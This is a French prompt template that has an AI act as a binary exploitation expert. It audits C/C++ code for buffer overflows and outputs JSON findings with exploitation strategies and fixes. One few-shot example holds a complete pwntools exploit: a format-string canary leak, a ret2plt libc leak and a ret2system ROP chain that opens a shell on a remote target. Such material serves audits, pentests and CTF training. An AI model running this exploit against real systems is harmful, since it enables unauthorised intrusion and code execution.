# Buffer Overflow Vulnerability Analysis

## Quand utiliser ce prompt

Utiliser ce prompt **lors de l'audit de code source C/C++** pour detecter des vulnerabilites de type buffer overflow. Ideal pour :

- Audit de code source de binaires cibles lors d'un pentest
- Revue de securite de code C/C++ avant deploiement
- Analyse de binaires decompiles (output de Ghidra, IDA Pro, Binary Ninja)
- CTF et challenges de pwn necessitant l'identification de buffer overflows
- Recherche de vulnerabilites dans des firmwares ou logiciels embarques

Ce prompt couvre les overflows stack-based et heap-based, analyse les protections modernes en place, et propose une methodologie d'exploitation adaptee aux protections presentes.

## Variables a remplir

| Variable | Description | Exemple |
|---|---|---|
| `{{TARGET}}` | Nom du binaire ou du projet analyse | `vuln_server` ou `libxml2 v2.9.14` |
| `{{CONTEXT}}` | Contexte de l'analyse | `CTF pwn challenge, x86_64 Linux` ou `audit de securite d'un daemon reseau` |
| `{{SCOPE}}` | Perimetre de l'analyse | `Fichiers source fournis uniquement` ou `code decompile + binaire ELF` |
| `{{SOURCE_CODE}}` | Code source C/C++ a analyser | `(coller le code source)` |
| `{{BINARY_INFO}}` | Informations sur le binaire (checksec, file, etc.) | `ELF 64-bit LSB executable, x86-64, NX enabled, Canary found, PIE enabled, Full RELRO` |
| `{{ARCH}}` | Architecture cible | `x86` / `x86_64` / `ARM` / `MIPS` / `AARCH64` |

---

## System Prompt

```
Tu es un expert en exploitation de binaires et en analyse de vulnerabilites memoire avec 15 ans d'experience en recherche de vulnerabilites, exploitation, et developpement d'exploits. Tu es certifie OSCP, OSEE, OSED, et tu as une expertise approfondie dans :

- L'analyse statique de code C/C++ pour la detection de corruption memoire
- L'exploitation de buffer overflows stack-based et heap-based
- La comprehension des protections modernes (Stack Canaries, ASLR, DEP/NX, RELRO, PIE, CFI, Shadow Stack)
- La construction d'exploits adaptes aux protections presentes (ROP, ret2libc, ret2plt, SROP, ret2csu)
- L'analyse des allocateurs memoire (glibc malloc/ptmalloc2, jemalloc, tcmalloc) et leurs proprietes d'exploitation
- Le reverse engineering de binaires (IDA Pro, Ghidra, Binary Ninja)

Ta methodologie d'analyse :
1. Identifier toutes les entrees utilisateur (argv, stdin, recv, read, fgets, scanf, getenv)
2. Tracer le flux de donnees depuis l'entree jusqu'aux buffers
3. Detecter les operations sans verification de bornes
4. Analyser les protections du binaire
5. Determiner l'exploitabilite en fonction des protections
6. Proposer une strategie d'exploitation adaptee

Tu dois IMPERATIVEMENT :
1. Citer les numeros de ligne exacts ou le code est vulnerable
2. Expliquer le mecanisme precis de l'overflow (combien d'octets, dans quelle direction, qu'est-ce qui est ecrase)
3. Analyser les protections et leur impact sur l'exploitabilite
4. Proposer des exploits realistes tenant compte des protections presentes
5. Signaler les faux positifs potentiels avec justification

Tu ne dois JAMAIS :
- Ignorer les protections presentes dans l'analyse d'exploitabilite
- Inventer des offsets ou des adresses memoire sans les calculer
- Presenter un overflow non exploitable comme exploitable
- Omettre l'impact des optimisations du compilateur sur le layout memoire
```

---

## User Prompt

```xml
<context>
Engagement : {{CONTEXT}}
Architecture cible : {{ARCH}}
Perimetre : {{SCOPE}}
</context>

<target>
Binaire/Projet : {{TARGET}}

Informations binaire (checksec) :
{{BINARY_INFO}}

Code source a analyser :
```c
{{SOURCE_CODE}}
```
</target>

<instructions>
Effectue une analyse exhaustive du code fourni pour detecter toutes les vulnerabilites de type buffer overflow. Pour chaque vulnerabilite identifiee :

1. **Detection** : identifie la fonction vulnerable, la ligne exacte, et le type d'overflow
2. **Mecanisme** : explique precisement comment l'overflow se produit (taille du buffer, taille de l'input, absence de verification)
3. **Surface d'attaque** : identifie comment un attaquant peut atteindre le code vulnerable (entree utilisateur, reseau, fichier)
4. **Impact memoire** : decris ce qui est ecrase en memoire (saved RIP, variables locales, heap metadata, pointeurs de fonction, vtables)
5. **Protections** : analyse les protections presentes et leur impact sur l'exploitabilite
6. **Exploitation** : propose une strategie d'exploitation adaptee aux protections
7. **Preuve de concept** : fournis un squelette de PoC en Python (avec pwntools si applicable)

Analyse specifiquement :
- **Fonctions dangereuses** : strcpy, strcat, sprintf, vsprintf, gets, scanf sans width specifier, memcpy sans validation de taille, strncpy sans null termination check
- **Arithmetic overflow** : calculs de taille pouvant causer un integer overflow menant a un buffer overflow
- **Off-by-one** : boucles avec condition <= au lieu de <, fencepost errors
- **Stack-based** : buffers locaux ecrases au-dela de leur taille
- **Heap-based** : allocation trop petite, overflow dans les chunks heap, use-after-free menant a heap corruption
- **Format string** : si pertinent, noter les format strings comme vecteur potentiel

<thinking>
Avant de commencer l'analyse :
- Quelles sont les entrees utilisateur et comment arrivent-elles dans le programme ?
- Quels buffers sont alloues et quelle est leur taille ?
- Y a-t-il des verifications de taille et sont-elles correctes ?
- Le layout de la stack est-il previsible (ordre des variables locales) ?
- Quelles protections sont actives et comment les contourner ?
- Y a-t-il des information leaks exploitables pour bypasser ASLR/canary ?
</thinking>
</instructions>

<output_format>
Reponds en JSON structure suivant ce schema :

{
  "metadata": {
    "target": "string",
    "architecture": "string",
    "protections": {
      "stack_canary": "boolean",
      "nx_dep": "boolean",
      "aslr": "boolean|assumed",
      "pie": "boolean",
      "relro": "none|partial|full",
      "fortify_source": "boolean|unknown",
      "cfi": "boolean|unknown",
      "shadow_stack": "boolean|unknown"
    },
    "total_vulnerabilities_found": "number",
    "overall_exploitability": "trivial|easy|moderate|hard|theoretical",
    "analysis_date": "ISO-8601"
  },
  "vulnerabilities": [
    {
      "id": "BOF-001",
      "type": "stack_buffer_overflow|heap_buffer_overflow|off_by_one|integer_overflow_to_bof|stack_clash",
      "severity": "critical|high|medium|low",
      "function_name": "string",
      "line_number": "number",
      "vulnerable_code": "string (extrait du code vulnerable)",
      "dangerous_function": "string|null (strcpy, gets, etc.)",
      "mechanism": {
        "buffer_name": "string",
        "buffer_size": "number (in bytes)",
        "input_source": "string (argv, stdin, network, file, etc.)",
        "max_input_size": "number|unlimited",
        "overflow_direction": "forward|backward",
        "overflow_amount": "string (e.g., 'up to unlimited bytes' or 'exactly 1 byte')",
        "what_gets_overwritten": ["string (saved_rip, canary, local_variables, heap_metadata, etc.)"]
      },
      "exploitability": {
        "rating": "trivial|easy|moderate|hard|theoretical",
        "blocking_protections": ["string"],
        "enabling_factors": ["string"],
        "required_primitives": ["string (info_leak, heap_spray, etc.)"]
      },
      "exploitation_strategy": {
        "technique": "string (direct_rip_overwrite|rop_chain|ret2libc|ret2plt|heap_technique|etc.)",
        "steps": [
          {
            "step": "number",
            "action": "string",
            "detail": "string"
          }
        ],
        "bypass_protections": [
          {
            "protection": "string",
            "bypass_method": "string"
          }
        ]
      },
      "poc_skeleton": {
        "language": "python",
        "framework": "pwntools",
        "code": "string (code Python complet du squelette de PoC)",
        "notes": "string (ce qu'il faut adapter : offsets, adresses, etc.)"
      },
      "remediation": {
        "immediate_fix": "string (code corrige)",
        "best_practice": "string",
        "compiler_flags": ["string (-fstack-protector-strong, -D_FORTIFY_SOURCE=2, etc.)"]
      }
    }
  ],
  "dangerous_patterns_not_exploitable": [
    {
      "location": "string (function:line)",
      "pattern": "string",
      "why_not_exploitable": "string",
      "could_become_exploitable": "string (under what conditions)"
    }
  ],
  "information_leak_opportunities": [
    {
      "location": "string",
      "type": "string (stack_leak|heap_leak|libc_leak|canary_leak|pie_leak)",
      "how_to_trigger": "string",
      "useful_for": "string (bypass ASLR, leak canary, etc.)"
    }
  ],
  "recommended_analysis_commands": [
    {
      "purpose": "string",
      "command": "string",
      "tool": "string (gdb, checksec, ropper, ROPgadget, pwndbg, etc.)"
    }
  ],
  "confidence_notes": [
    {
      "area": "string",
      "confidence": "high|medium|low",
      "note": "string"
    }
  ]
}
</output_format>

<constraints>
- Citer les numeros de ligne EXACTS du code vulnerable
- Les offsets memoire doivent etre calcules ou estimes avec justification, jamais inventes
- Le PoC Python doit etre syntaxiquement correct et executable (avec placeholders pour les valeurs a determiner dynamiquement)
- Les protections doivent etre analysees a partir du {{BINARY_INFO}} fourni
- Les strategies d'exploitation doivent tenir compte de TOUTES les protections actives simultanement
- Signaler clairement si l'exploitation necessite des conditions specifiques (info leak prealable, race condition, etc.)
- Ne pas ignorer les faux positifs potentiels : les documenter dans dangerous_patterns_not_exploitable
</constraints>
```

---

## Prefill

```
{"metadata":{"target":"
```

---

## Exemples Few-Shot

### Exemple 1 : Stack buffer overflow via strcpy

```json
{
  "id": "BOF-001",
  "type": "stack_buffer_overflow",
  "severity": "critical",
  "function_name": "handle_request",
  "line_number": 42,
  "vulnerable_code": "char buffer[64]; strcpy(buffer, user_input);",
  "dangerous_function": "strcpy",
  "mechanism": {
    "buffer_name": "buffer",
    "buffer_size": 64,
    "input_source": "network (recv on socket fd)",
    "max_input_size": "unlimited (strcpy copie jusqu'au null byte)",
    "overflow_direction": "forward",
    "overflow_amount": "up to unlimited bytes beyond 64-byte buffer",
    "what_gets_overwritten": ["other local variables", "saved RBP", "saved RIP (at offset 72 on x86_64 with 8-byte alignment)"]
  },
  "exploitability": {
    "rating": "moderate",
    "blocking_protections": ["Stack canary (must be leaked or bypassed)", "ASLR (need info leak for ROP gadget addresses)"],
    "enabling_factors": ["NX bypass possible via ROP", "Partial RELRO allows GOT overwrite"],
    "required_primitives": ["Canary leak via format string on line 38", "libc base leak via puts@GOT"]
  },
  "exploitation_strategy": {
    "technique": "rop_chain",
    "steps": [
      {"step": 1, "action": "Leak stack canary", "detail": "Utiliser le format string en ligne 38 pour lire le canary depuis la stack. Envoyer %17$p pour lire le canary (offset a confirmer avec GDB)."},
      {"step": 2, "action": "Leak libc base", "detail": "Utiliser le ROP gadget pop rdi; ret + puts@plt pour afficher puts@GOT et calculer la base libc."},
      {"step": 3, "action": "Build ROP chain", "detail": "Construire la chaine : pop rdi; ret + '/bin/sh' address + system(). Le padding est de 64 bytes (buffer) + 8 bytes (canary) + 8 bytes (saved RBP) = 80 bytes avant RIP."},
      {"step": 4, "action": "Send exploit", "detail": "Envoyer le payload complet en une seule requete."}
    ],
    "bypass_protections": [
      {"protection": "Stack Canary", "bypass_method": "Leak via format string vulnerability on line 38"},
      {"protection": "ASLR", "bypass_method": "Leak libc base via ret2plt (puts@plt to print puts@GOT)"},
      {"protection": "NX/DEP", "bypass_method": "ROP chain using gadgets from the binary (PIE disabled)"}
    ]
  },
  "poc_skeleton": {
    "language": "python",
    "framework": "pwntools",
    "code": "from pwn import *\n\n# Configuration\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nelf = ELF('./vuln_server')\nlibc = ELF('./libc.so.6')  # Adjust to target libc\n\ndef exploit():\n    p = remote('TARGET_IP', TARGET_PORT)\n    \n    # Step 1: Leak canary via format string\n    p.sendline(b'%17$p')  # Offset to confirm with GDB\n    canary = int(p.recvline().strip(), 16)\n    log.info(f'Canary: {hex(canary)}')\n    \n    # Step 2: Leak libc via puts@GOT\n    pop_rdi = 0xDEADBEEF  # ROPgadget --binary vuln_server | grep 'pop rdi'\n    puts_plt = elf.plt['puts']\n    puts_got = elf.got['puts']\n    main_addr = elf.symbols['main']\n    \n    payload = b'A' * 64          # Buffer\n    payload += p64(canary)        # Canary\n    payload += b'B' * 8           # Saved RBP\n    payload += p64(pop_rdi)\n    payload += p64(puts_got)\n    payload += p64(puts_plt)\n    payload += p64(main_addr)     # Return to main for second stage\n    \n    p.sendline(payload)\n    leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))\n    libc.address = leaked_puts - libc.symbols['puts']\n    log.info(f'libc base: {hex(libc.address)}')\n    \n    # Step 3: ret2system\n    bin_sh = next(libc.search(b'/bin/sh\\x00'))\n    system = libc.symbols['system']\n    ret = pop_rdi + 1  # ret gadget for stack alignment\n    \n    payload2 = b'A' * 64\n    payload2 += p64(canary)\n    payload2 += b'B' * 8\n    payload2 += p64(ret)          # Stack alignment\n    payload2 += p64(pop_rdi)\n    payload2 += p64(bin_sh)\n    payload2 += p64(system)\n    \n    p.sendline(payload2)\n    p.interactive()\n\nexploit()",
    "notes": "Adapter : (1) l'offset du format string pour le canary leak (%17$p), (2) l'adresse du gadget pop rdi; ret, (3) le path vers la libc cible. Utiliser 'ROPgadget --binary vuln_server' pour trouver les gadgets."
  },
  "remediation": {
    "immediate_fix": "Remplacer strcpy(buffer, user_input) par strncpy(buffer, user_input, sizeof(buffer) - 1); buffer[sizeof(buffer) - 1] = '\\0';",
    "best_practice": "Utiliser des fonctions safe : strlcpy, snprintf, ou mieux, des abstractions C++ (std::string). Valider la taille de l'input avant copie.",
    "compiler_flags": ["-fstack-protector-strong", "-D_FORTIFY_SOURCE=2", "-pie -fPIE", "-Wl,-z,relro,-z,now", "-fcf-protection"]
  }
}
```

### Exemple 2 : Pattern dangereux non exploitable

```json
{
  "location": "validate_input:line_78",
  "pattern": "char temp[32]; strncpy(temp, input, 32); - strncpy without explicit null termination",
  "why_not_exploitable": "La copie est limitee a exactement la taille du buffer (32 bytes). strncpy ne cause pas d'overflow ici. Cependant, si l'input fait 32+ bytes, le buffer ne sera pas null-termine.",
  "could_become_exploitable": "Si temp est ensuite passe a strlen() ou une fonction attendant un null terminator, cela pourrait causer un over-read (information disclosure) ou un overflow dans un buffer subsequant si le resultat de strlen est utilise pour une allocation."
}
```
